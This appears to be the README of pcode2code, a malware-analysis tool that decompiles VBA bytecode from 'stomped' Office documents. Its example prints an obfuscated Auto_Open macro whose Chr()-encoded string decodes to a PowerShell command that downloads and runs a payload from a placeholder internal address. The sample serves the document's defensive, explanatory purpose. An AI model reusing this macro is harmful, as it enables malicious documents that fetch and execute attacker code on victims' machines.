# pcode2code.py - A VBA p-code decompiler

## What is it?

In 2019, [EvilClippy](https://github.com/outflanknl/EvilClippy) tool made easily available for any attacker to dispose of an Office document where the macro code is transformed directly into bytecode. For any reference, please check [this](https://medium.com/walmartlabs/vba-stomping-advanced-maldoc-techniques-612c484ab278) or [this](https://vbastomp.com/). To be able to analyze such "stomped" documents, Dr. Bontchev ([@VessOnSecurity](https://twitter.com/VessOnSecurity)) released [pcodedmp](https://github.com/bontchev/pcodedmp), a tool printing out the VBA bytecode of a document in a readable manner. However, the output might be still hardly readable and analyzable (please check out macaroni in tests folder). As such, pcode2code decompiles, based on [pcodedmp](https://github.com/bontchev/pcodedmp)'s output, the VBA code.

## Kudos

Huge Kudos to Dr. Bontchev ([@VessOnSecurity](https://twitter.com/VessOnSecurity)) who made all the hard work. Just figured out how much time should have been needed for pcodedmp to work.

## example

Let's consider a document, whose code is the following:

```
Sub Auto_Open()
    Dim exec As String
    Dim testvar As String
    Shell Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(32) & Chr(73) & Chr(69) & Chr(88) & Chr(32) & Chr(40) & Chr(40) & Chr(110) & Chr(101) & Chr(119) & Chr(45) & Chr(111) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(32) & Chr(110) & Chr(101) & Chr(116) & Chr(46) & Chr(119) & Chr(101) & Chr(98) & Chr(99) & Chr(108) & Chr(105) & Chr(101) & Chr(110) & Chr(116) & Chr(41) & Chr(46) & Chr(100) & Chr(111) & Chr(119) & Chr(110) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(115) & Chr(116) & Chr(114) & Chr(105) & Chr(110) & Chr(103) & Chr(40) & Chr(39) & Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(49) & Chr(51) & Chr(47) & Chr(112) & Chr(97) & Chr(121) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(46) & Chr(116) & Chr(120) & Chr(116) & Chr(39) & Chr(41) & Chr(41)
End Sub
```

If you use pcodedmp on this document, you will obtain the following output:

```
VBA/ThisDocument - 2809 bytes
Line #0:
        FuncDefn (Sub Auto_Open())
Line #1:
        Dim
        VarDefn exec (As String)
Line #2:
        Dim
        VarDefn testvar (As String)
Line #3:
        LitDI2 0x0070
        ArgsLd Chr 0x0001
        LitDI2 0x006F
        ArgsLd Chr 0x0001
        Concat
        LitDI2 0x0077
	ArgsLd Chr 0x0001
	Concat
	LitDI2 0x0065
	ArgsLd Chr 0x0001
	Concat
	LitDI2 0x0072
	ArgsLd Chr 0x0001
	Concat
	LitDI2 0x0073
	ArgsLd Chr 0x0001
	Concat
	LitDI2 0x0068
	ArgsLd Chr 0x0001
	Concat
	LitDI2 0x0065
	ArgsLd Chr 0x0001
	Concat
	[ .... -> 252 more lines like this]
	LitDI2 0x0029
        ArgsLd Chr 0x0001
        Concat
        LitDI2 0x0029
        ArgsLd Chr 0x0001
        Concat
        ArgsCall Shell 0x0001
Line #4:
        EndSub
```

If you use pcode2code, the output will be the following:

```
stream : VBA/ThisDocument - 2809 bytes
########################################

Sub Auto_Open()
  Dim exec As String
  Dim testvar As String
  Shell Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(32) & Chr(73) & Chr(69) & Chr(88) & Chr(32) & Chr(40) & Chr(40) & Chr(110) & Chr(101) & Chr(119) & Chr(45) & Chr(111) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(32) & Chr(110) & Chr(101) & Chr(116) & Chr(46) & Chr(119) & Chr(101) & Chr(98) & Chr(99) & Chr(108) & Chr(105) & Chr(101) & Chr(110) & Chr(116) & Chr(41) & Chr(46) & Chr(100) & Chr(111) & Chr(119) & Chr(110) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(115) & Chr(116) & Chr(114) & Chr(105) & Chr(110) & Chr(103) & Chr(40) & Chr(39) & Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(49) & Chr(51) & Chr(47) & Chr(112) & Chr(97) & Chr(121) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(46) & Chr(116) & Chr(120) & Chr(116) & Chr(39) & Chr(41) & Chr(41)
End Sub
```



## Installation

The script will work both in Python version 2.6+ and in Python 3.x. The simplest way to install it is from [PyPi](https://pypi.org/) with `pip`:

    pip install pcode2code -U

The above command will install the latest version of `pcode2code` (upgrading an older one if it already exists) with `pcodedmp` as a dependency. Indeed, it permits to have all the functionalities of the tool.

If you would rather install it from the GitHub repository, you can do it like this:

    git clone 
    cd pcode2code
    pip install .

## Usage

The script takes as a command-line argument either an OLE2 document which has been stomped, or the dump of a previously analyzed document with pcodedmp. In the latter, you should use the `-p` option. By default, the output of the processing is printed on console and should be valid VBA code.

The script also accepts the following command-line options:

`-h`, `--help` Displays a short explanation how to use the script and what the command-line options are.

`-v`, `--version` Displays the version of the script.

`-n`, `--linenum` Indicates if line numbers should be included within the output. Please pay attention the output code is no more valid as a VBA code.

`-p`, `--pcodedump` Indicates if the input is a previously pcodedmp's dump.

`-o OUTFILE`, `--output OUTFILE` Save the results to the specified output file, instead of sending it to the standard output.

`-d`, `--debug` Used for debugging and development purposes. Here, exceptions are not handled making the script interrupted for any error.

## API

The module can be imported as such in your python script (if it's in your path)

    import pcode2code

While i let all functions to be available, the following function should be used:

- `process(inputfile, outputfile=None, ispcodedump=False, linenum=False, isdebug=False)` :

  realize the decompiling operation on an input.
  args are the following : inputfile = file to be processed, outputfile = where to write, writes to stdout by default, ispcodedump = if the input file is a previous dump of pcodedmp use this, linenum : line numbers are to be printed in the output, isdebug : wether debugging mode should be used.

  Here is an example
  ```python
  import pcode2code
  pcode2code.process('~/evil.docm', 'output.txt')
  ```

## Found a bug?

Before submitting an issue, please checks the following point:

- your error is a generic python error/ you have a "generic exception occured" printed on screen:
  - Well, just submit the error found, with the attached document.

- you get some "Pcode2codeException" error:
  - First, run pcodedmp on your document, and locate the problematic line and the problematic opcode
  - Second, check if the opcode is already known to be problematic for pcodedmp (on its README) or if it's already in the known problems (below)
  - if not, please submit your document, the problem, as well as the corresponding output of pcodedmp
  - if yes, well you should just wait for a new version (or contribute by yourself :) )

- you cross-checked with the original program, and the output is wrong, even if not exception occured.
  - in this case, you should run pcodedmp on your document, and check first if pcodedmp output is meaningful (this tool relies on it)
  - if yes, then submit your bug with the document
  - if not, please ask @VessOnSecurity

## Known problems

- all limitations of [pcodedmp](https://github.com/bontchev/pcodedmp) apply here
- the following bytecode commands are not supported now: scale, all commands related to index, me, meimplicit, implements, any date literal or floating point literal

## Contributing

I'm fully open to any contribution, as tiny as it is. Don't hesitate to mail me or to ping me on twitter.

## To be done

- provide a correct contributing guide, and make the code follows coding standards
- provide a better output (indentation, decoding all bytecode commands, ...)
- provide a mean to detect automatically previous dump or OLE2
- more tests...


## Change log

21 nov 2019 : version 1.0 released


## contributors

- Zilio Nicolas, author


## To go further

Obtaining the code might not be sufficient enough. Don't hesitate to give a try to [SourceFu](https://github.com/Big5-sec/SourceFu) to deobfuscate the code, or create a document and use [ViperMonkey](https://github.com/decalage2/ViperMonkey).
